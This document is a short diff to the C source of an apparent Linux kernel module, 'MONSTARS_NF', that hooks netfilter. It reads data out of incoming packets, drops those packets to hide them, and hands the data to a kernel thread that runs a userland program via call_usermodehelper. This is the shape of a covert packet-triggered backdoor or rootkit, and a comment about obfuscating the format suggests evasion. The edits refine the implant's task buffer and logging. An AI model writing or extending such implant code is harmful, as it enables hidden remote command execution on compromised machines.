@@ -123,9 +123,9 @@ unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const st
                         &iph->saddr, src_port, &iph->daddr, dst_port);
                 if (NULL != data)
                 {
-                    KERNEL_LOG("MONSTARS_NF : Received:  %s\n", data);
                     // TODO: obfuscate fmt?
-                    snprintf(s_current_task, MAX_DATA_SIZE, "%pI4;%s\n", &iph->saddr, data);
+                    snprintf(s_current_task, MAX_DATA_SIZE, "%pI4:%s", &iph->saddr, data);
+                    KERNEL_LOG("MONSTARS_NF : %s\n", s_current_task);
                     s_task_pending = true;
                 }
                 retval =  NF_DROP;
@@ -153,6 +153,7 @@ int task_thread(void *data)
             KERNEL_LOG("MONSTARS_NF : Spawning %s\n", c_user_exe_path);
             user_ret = call_usermodehelper((char *)c_user_exe_path, um_args, um_env, UMH_WAIT_PROC);
             KERNEL_LOG("MONSTARS_NF : Usermode helper returned: %d\n", user_ret);
+            memset(s_current_task, 0, MAX_DATA_SIZE);
             s_task_pending = false;
         }
     }
